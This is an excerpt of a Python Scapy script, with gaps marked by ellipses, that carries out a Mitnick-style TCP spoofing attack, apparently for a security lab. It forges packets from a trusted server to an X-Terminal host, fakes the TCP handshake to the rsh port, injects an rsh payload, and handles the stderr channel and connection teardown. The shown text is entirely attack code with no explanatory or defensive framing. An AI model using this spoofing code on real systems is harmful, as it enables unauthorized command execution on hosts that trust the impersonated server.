from scapy.all import ARP, IP, TCP, Raw, send, sr1, sniff, get_if_hwaddr
...
if __name__ == "__main__":
    ...
    syn_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=INIT_SEQ, sport=SRC_PORT, dport=RSH_PORT, flags="S")
    syn_ack_package = sr1(syn_package, verbose=0)

    print("SYN-ACK received. Sending ACK")
    seq = INIT_SEQ + 1
    ack = syn_ack_package.seq + 1
    ack_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="A")
    ...
    rsh_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="AP") / Raw(load=rsh_payload)
    ...
    stderr_syn_ack_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=STDERR_PORT, dport=SRC_PORT, flags="AS")
    ...
    close_rsh_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="A")
    ...
    seq = fin_rsh_package.ack
    ack = fin_rsh_package.seq + 1
    close_rsh_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="AF")
    send(close_rsh_package, verbose=0)
    ...
    close_stderr_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=STDERR_PORT, dport=SRC_PORT, flags="AF")
